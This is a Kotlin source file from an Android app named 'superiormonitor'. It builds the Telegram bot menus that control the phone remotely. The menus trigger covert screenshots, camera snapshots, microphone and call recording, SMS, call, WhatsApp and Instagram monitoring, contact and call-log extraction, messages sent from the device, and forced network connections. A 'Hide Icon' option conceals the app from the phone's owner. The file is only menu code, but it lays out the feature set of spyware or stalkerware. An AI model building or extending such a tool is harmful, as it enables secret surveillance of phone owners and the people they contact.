package com.system.superiormonitor.bot

import android.content.Context
import com.system.superiormonitor.data.PrefsManager
import com.chiller3.bcr.Preferences
import com.chiller3.bcr.format.AudioSource
import com.chiller3.bcr.format.Format
import com.chiller3.bcr.format.RangedParamInfo
import com.chiller3.bcr.format.RangedParamType

object BotMarkups {

    object Core {
        fun buildEmptyKeyboard(): String = "{\"inline_keyboard\": []}"

        fun buildMainKeyboard(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "System Check", "callback_data": "cmd_status"},
                        {"text": "Settings", "callback_data": "cmd_settings"}
                    ],
                    [
                        {"text": "Menu", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMenuMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "⚠️ Send Message", "callback_data": "menu_send_message"}
                    ],
                    [
                        {"text": "Snapshot Engine", "callback_data": "menu_snapshot"}
                    ],
                    [
                        {"text": "Media Ops", "callback_data": "cmd_media_ops"}
                    ],
                    [
                        {"text": "Fetch Data", "callback_data": "cmd_fetch_ops"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSendMessageWarningMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "New Message", "callback_data": "action_new_message"}
                    ],
                    [
                        {"text": "Back", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()
    }

    object Settings {
        fun buildPersistentEnforcementMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            
            if (!prefs.persistentEnforcementEnabled) {
                return """
                {
                    "inline_keyboard": [
                        [
                            {"text": "⚠️ Activate This Feature", "callback_data": "activate_persistent"}
                        ],
                        [
                            {"text": "Back", "callback_data": "settings_superior"}
                        ]
                    ]
                }
                """.trimIndent()
            } else {
                val dataBtn = if (prefs.forceMobileData) "✅ Force Mobile Data" else "❌ Force Mobile Data"
                val wifiBtn = if (prefs.forceWifi) "✅ Force Wi-Fi" else "❌ Force Wi-Fi"
                val hotspotBtn = if (prefs.forceHotspot) "✅ Force Hotspot" else "❌ Force Hotspot"
                
                return """
                {
                    "inline_keyboard": [
                        [
                            {"text": "$dataBtn", "callback_data": "toggle_force_data"}
                        ],
                        [
                            {"text": "$wifiBtn", "callback_data": "toggle_force_wifi"}
                        ],
                        [
                            {"text": "$hotspotBtn", "callback_data": "toggle_force_hotspot"}
                        ],
                        [
                            {"text": "Deactivate This Feature", "callback_data": "deactivate_persistent"}
                        ],
                        [
                            {"text": "Back", "callback_data": "settings_superior"}
                        ]
                    ]
                }
                """.trimIndent()
            }
        }

        fun buildBasicUpdatesMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val callBtn = if (prefs.callAlertsEnabled) "✅ Call Events" else "❌ Call Events"
            val smsBtn = if (prefs.smsAlertsEnabled) "✅ SMS Events" else "❌ SMS Events"

            return """
            {
                "inline_keyboard": [
                    [
                        {"text": "📞 Call Recording", "callback_data": "superior_call_rec_menu"}
                    ],
                    [
                        {"text": "$callBtn", "callback_data": "toggle_call_events"}
                    ],
                    [
                        {"text": "$smsBtn", "callback_data": "toggle_sms_events"}
                    ],
                    [
                        {"text": "Back", "callback_data": "settings_superior"}
                    ]
                ]
            }
            """.trimIndent()
        }

        fun buildCallRecordingMenuMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val recBtn = if (prefs.forwardRecordingEnabled) "✅ Call Recording" else "❌ Call Recording"

            return """
            {
                "inline_keyboard": [
                    [
                        {"text": "$recBtn", "callback_data": "toggle_call_rec"}
                    ],
                    [
                        {"text": "⚙️ Recorder Engine Settings", "callback_data": "superior_rec_settings"}
                    ],
                    [
                        {"text": "⬅️ Back", "callback_data": "superior_basic_updates"}
                    ]
                ]
            }
            """.trimIndent()
        }
        
        fun buildSocialUpdatesMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val whatsappBtn = if (prefs.whatsappUpdatesEnabled) "✅ WhatsApp" else "❌ WhatsApp"
            val waBusinessBtn = if (prefs.whatsappBusinessUpdatesEnabled) "✅ WA Business" else "❌ WA Business"
            val instagramBtn = if (prefs.instagramEnabled) "✅ Instagram" else "❌ Instagram"
            
            return """
            {
                "inline_keyboard": [
                    [
                        {"text": "$whatsappBtn", "callback_data": "toggle_whatsapp"},
                        {"text": "$waBusinessBtn", "callback_data": "toggle_wabusiness"}
                    ],
                    [
                        {"text": "$instagramBtn", "callback_data": "toggle_instagram"}
                    ],
                    [
                        {"text": "Back", "callback_data": "settings_superior"}
                    ]
                ]
            }
            """.trimIndent()
        }

        fun buildSuperiorLauncherMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Open Application", "callback_data": "superior_open"}
                    ],
                    [
                        {"text": "Hide Icon", "callback_data": "superior_hide"},
                        {"text": "Unhide Icon", "callback_data": "superior_unhide"}
                    ],
                    [
                        {"text": "Back", "callback_data": "settings_superior"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildBackToSettingsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Back", "callback_data": "cmd_settings"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSettingsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Superior Settings", "callback_data": "settings_superior"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildSuperiorSettingsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Launcher", "callback_data": "superior_launcher"}
                    ],
                    [
                        {"text": "Snapshot Settings", "callback_data": "superior_snapshots"}
                    ],
                    [
                        {"text": "Persistent Enforcement", "callback_data": "superior_persistent"}
                    ],
                    [
                        {"text": "Basic Updates", "callback_data": "superior_basic_updates"}
                    ],
                    [
                        {"text": "Social Updates", "callback_data": "superior_social_updates"}
                    ],
                    [
                        {"text": "Back", "callback_data": "cmd_settings"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildRecorderSettingsMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val telecomBtn = if (bcrPrefs.recordTelecomApps) "✅ Record Telecom Apps" else "❌ Record Telecom Apps"
            val dialingBtn = if (bcrPrefs.recordDialingState) "✅ Record Dialing State" else "❌ Record Dialing State"

            val buttons = mutableListOf<String>()
            buttons.add("""[{"text": "⚙️ Change Audio Source", "callback_data": "rec_sel_source"}]""")
            buttons.add("""[{"text": "⚙️ Change Encoding Format", "callback_data": "rec_sel_format"}]""")
            
            if (format.sampleRateInfo.presets.size > 1) {
                buttons.add("""[{"text": "⚙️ Change Sample Rate", "callback_data": "rec_sel_samplerate"}]""")
            }
            if (format.paramInfo.presets.size > 1) {
                buttons.add("""[{"text": "⚙️ Change Parameter", "callback_data": "rec_sel_param"}]""")
            }
            
            buttons.add("""[{"text": "$telecomBtn", "callback_data": "toggle_rec_telecom"}]""")
            buttons.add("""[{"text": "$dialingBtn", "callback_data": "toggle_rec_dialing"}]""")
            buttons.add("""[{"text": "⬅️ Back to Call Recording", "callback_data": "superior_call_rec_menu"}]""")

            return """{"inline_keyboard": [${buttons.joinToString(",\n")}]}"""
        }
        
        fun buildRecSelectSourceMarkup(): String {
            val options = AudioSource.entries
            val buttons = options.joinToString(",\n") { source ->
                val label = when (source) {
                    AudioSource.VOICE_CALL -> "Voice Call (Mono)"
                    AudioSource.VOICE_UPLINK_DOWNLINK -> "Voice Uplink + Downlink (Stereo)"
                    AudioSource.VOICE_UPLINK -> "Voice Uplink (You)"
                    AudioSource.VOICE_DOWNLINK -> "Voice Downlink (Them)"
                }
                """[{"text": "$label", "callback_data": "rec_set_source_${source.name}"}]"""
            }
            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
        }

        fun buildRecSelectFormatMarkup(): String {
            val buttons = Format.all.joinToString(",\n") { format ->
                """[{"text": "${format.name}", "callback_data": "rec_set_format_${format.name}"}]"""
            }
            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
        }

        fun buildRecSelectSampleRateMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val sampleRates = format.sampleRateInfo.presets
            
            val buttons = sampleRates.joinToString(",\n") { rate ->
                """[{"text": "$rate Hz", "callback_data": "rec_set_samplerate_$rate"}]"""
            }
            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
        }

        fun buildRecSelectParamMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val params = format.paramInfo.presets
            
            val paramLabel = if (format.paramInfo is RangedParamInfo) {
                when ((format.paramInfo as RangedParamInfo).type) {
                    RangedParamType.Bitrate -> "kbps"
                    RangedParamType.CompressionLevel -> "Level"
                    else -> ""
                }
            } else "Quality"

            val buttons = params.joinToString(",\n") { param ->
                val text = if (paramLabel == "kbps") "$param $paramLabel" else "$paramLabel $param"
                """[{"text": "$text", "callback_data": "rec_set_param_$param"}]"""
            }
            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
        }
    }

    object MediaOps {
        fun buildSnapshotSettingsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Screenshots", "callback_data": "cfg_snap_screen"}
                    ],
                    [
                        {"text": "Front Camera", "callback_data": "cfg_snap_front"}
                    ],
                    [
                        {"text": "Rear Camera", "callback_data": "cfg_snap_rear"}
                    ],
                    [
                        {"text": "Back", "callback_data": "settings_superior"}
                    ]
                ]
            }
        """.trimIndent()
        
        fun buildSnapshotFeatureMarkup(context: Context, feature: String): String {
            val prefs = PrefsManager.getInstance(context)
            val isEnabled = when (feature) {
                "Screenshots" -> prefs.enableSnapshots
                "Front Camera" -> prefs.enableFrontCamera
                else -> prefs.enableRearCamera
            }
            val currentInterval = when (feature) {
                "Screenshots" -> prefs.snapshotIntervalMin
                "Front Camera" -> prefs.frontCameraInterval
                else -> prefs.rearCameraInterval
            }
            
            val prefix = when (feature) {
                "Screenshots" -> "set_snap_screen"
                "Front Camera" -> "set_snap_front"
                else -> "set_snap_rear"
            }
            
            val t1 = if (isEnabled && currentInterval == 1) "✅ 1 Min (Test)" else "1 Min (Test)"
            val t5 = if (isEnabled && currentInterval == 5) "✅ 5 Min" else "5 Min"
            val t10 = if (isEnabled && currentInterval == 10) "✅ 10 Min" else "10 Min"
            val t15 = if (isEnabled && currentInterval == 15) "✅ 15 Min" else "15 Min"
            val t30 = if (isEnabled && currentInterval == 30) "✅ 30 Min" else "30 Min"
            val t45 = if (isEnabled && currentInterval == 45) "✅ 45 Min" else "45 Min"
            val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
            val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
            
            val disableButtonJson = if (isEnabled) {
                """
                    [
                        {"text": "Disable this Feature", "callback_data": "${prefix}_disable"}
                    ],
                """
            } else {
                ""
            }
            
            return """
            {
                "inline_keyboard": [
                    [
                        {"text": "$t1", "callback_data": "${prefix}_1"},
                        {"text": "$t5", "callback_data": "${prefix}_5"}
                    ],
                    [
                        {"text": "$t10", "callback_data": "${prefix}_10"},
                        {"text": "$t15", "callback_data": "${prefix}_15"}
                    ],
                    [
                        {"text": "$t30", "callback_data": "${prefix}_30"},
                        {"text": "$t45", "callback_data": "${prefix}_45"}
                    ],
                    [
                        {"text": "$t60", "callback_data": "${prefix}_60"},
                        {"text": "$t120", "callback_data": "${prefix}_120"}
                    ],
                    $disableButtonJson
                    [
                        {"text": "Back", "callback_data": "superior_snapshots"}
                    ]
                ]
            }
            """.trimIndent()
        }
        
        fun buildSnapshotMenuMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Get ScreenShot", "callback_data": "action_cap_screen"},
                        {"text": "Get RearShot", "callback_data": "action_cap_rear"}
                    ],
                    [
                        {"text": "Get Frontshot", "callback_data": "action_cap_front"},
                        {"text": "Back to Menu", "callback_data": "menu_main"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildCaptureSuccessMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Back to SnapShot Engine", "callback_data": "menu_snapshot"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMediaOpsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Microphone", "callback_data": "menu_microphone"}
                    ],
                    [
                        {"text": "Back to Menu", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildMicrophoneMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "1 Min", "callback_data": "action_mic_1m"},
                        {"text": "3 Min", "callback_data": "action_mic_3m"}
                    ],
                    [
                        {"text": "5 Min", "callback_data": "action_mic_5m"},
                        {"text": "10 Min", "callback_data": "action_mic_10m"}
                    ],
                    [
                        {"text": "Back to MediaOps", "callback_data": "cmd_media_ops"}
                    ]
                ]
            }
        """.trimIndent()
    }

    object FetchOps {
        fun buildFetchOpsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Contacts", "callback_data": "menu_contacts"},
                        {"text": "Call Activity", "callback_data": "menu_calls"}
                    ],
                    [
                        {"text": "Back to Menu", "callback_data": "cmd_menu"}
                    ]
                ]
            }
        """.trimIndent()

        fun buildContactsMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Fetch All Contacts", "callback_data": "action_fetch_contacts"}
                    ],
                    [
                        {"text": "Back to FetchOps", "callback_data": "cmd_fetch_ops"}
                    ]
                ]
            }
        """.trimIndent()
        
        fun buildCallActivityMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Recent 3", "callback_data": "action_fetch_calls_3"},
                        {"text": "Recent 5", "callback_data": "action_fetch_calls_5"}
                    ],
                    [
                        {"text": "Recent 10", "callback_data": "action_fetch_calls_10"},
                        {"text": "Recent 15", "callback_data": "action_fetch_calls_15"}
                    ],
                    [
                        {"text": "Back to FetchOps", "callback_data": "cmd_fetch_ops"}
                    ]
                ]
            }
        """.trimIndent()
    }

    object Alerts {
        fun buildLockedScreenMarkup(): String =
                """
            {
                "inline_keyboard": [
                    [
                        {"text": "Back to SnapShot Engine", "callback_data": "menu_snapshot"}
                    ]
                ]
            }
        """.trimIndent()



        fun buildUnauthorizedMarkup(): String =
                """{"inline_keyboard":[[{"text":"Bot Repository","url":"https://gitlab.com/sandeshsahu/superiormonitor"}]]}"""
    }
}
